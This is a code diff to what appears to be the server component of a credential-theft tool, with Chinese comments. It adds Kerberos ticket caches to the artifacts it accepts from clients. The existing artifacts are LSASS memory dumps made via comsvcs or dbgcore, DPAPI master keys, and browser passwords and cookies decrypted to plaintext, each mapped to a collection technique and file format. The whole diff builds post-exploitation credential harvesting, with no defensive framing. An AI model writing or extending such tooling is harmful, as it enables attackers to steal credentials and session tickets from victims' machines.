@@ -19,6 +19,7 @@ const (
 	KindLsass   = "lsass"   // LSASS 内存转储（二进制转储，服务端只校验形态）
 	KindDPAPI   = "dpapi"   // DPAPI 主密钥集（ZIP 制品，用户作用域已解密）
 	KindBrowser = "browser" // 浏览器凭据与 Cookie（JSON 制品，客户端已解密为明文）
+	KindTicket  = "ticket"  // Kerberos 票据缓存（ZIP：manifest.json + tickets/*.ccache，服务端解析）
 )
 
 // 制品形态：决定回传后用什么方式校验（与客户端产出的文件类型一一对应）
@@ -29,7 +30,7 @@ const (
 )
 
 // Kinds 支持的制品类型
-var Kinds = []string{KindLsass, KindDPAPI, KindBrowser}
+var Kinds = []string{KindLsass, KindDPAPI, KindBrowser, KindTicket}
 
 // techsByKind 每种制品类型可用的获取技术（与客户端 core/services/cred.go 的分派一致）。
 // 技术不是全局枚举：把 "browser" 和 "comsvcs" 配在一起没有意义，
@@ -38,6 +39,7 @@ var techsByKind = map[string][]string{
 	KindLsass:   {"auto", "comsvcs", "dbgcore"},
 	KindDPAPI:   {"keys"},
 	KindBrowser: {"all", "chrome", "edge", "firefox"},
+	KindTicket:  {"files"}, // 只做文件式 ccache（Windows 原生 LSA 票据不在此列）
 }
 
 // DefaultTech 某类型的默认技术
@@ -54,6 +56,7 @@ var extByKind = map[string]string{
 	KindLsass:   ".dmp",
 	KindDPAPI:   ".zip",
 	KindBrowser: ".json",
+	KindTicket:  ".zip",
 }
 
 // IsKindSupported 制品类型是否支持
@@ -108,6 +111,8 @@ func FormatByKind(kind string) string {
 		return FormatZip
 	case KindBrowser:
 		return FormatJSON
+	case KindTicket:
+		return FormatZip
 	default:
 		return FormatMinidump
 	}
